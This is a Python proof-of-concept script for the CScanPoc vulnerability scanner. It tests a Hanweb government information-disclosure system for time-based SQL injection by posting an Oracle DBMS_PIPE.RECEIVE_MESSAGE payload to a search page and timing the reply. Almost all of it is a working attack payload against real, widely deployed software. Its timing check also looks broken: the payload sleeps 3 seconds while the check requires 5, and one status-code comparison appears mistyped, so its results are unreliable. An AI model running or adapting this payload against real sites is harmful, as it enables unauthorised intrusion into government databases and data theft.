# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'cb50841f-4ee0-4536-8ad4-8734ff6ff70e'
    name = '南京大汉某政府信息公开系统存在通用型SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-02-05'  # 漏洞公布时间
    desc = '''
        南京大汉某政府信息公开系统存在通用型SQL注入
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0150571
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '84e53478-eccd-4053-a848-bb0a151b9aa0'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/jcms_files/jcms1/web1/site/zfxxgk/ysqgk/ysqgksearch.jsp"
            postpayload = "currpage=&stateid=1&applystarttime=&applyendtime=&webid=1"
            postpayload2 = postpayload + '%20AND%207380=DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(102)||CHR(77)||CHR(115),3)'
            time0 = time.time()
            code1, head, res, errcode, _ = hh.http(url, postpayload)
            time1 = time.time()
            code2, head, res, errcode, _ = hh.http(url, postpayload2)
            time2 = time.time()
            if code1!=0 and code2!=2 and ((time2 - time1) - (time1 - time0)) >= 5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()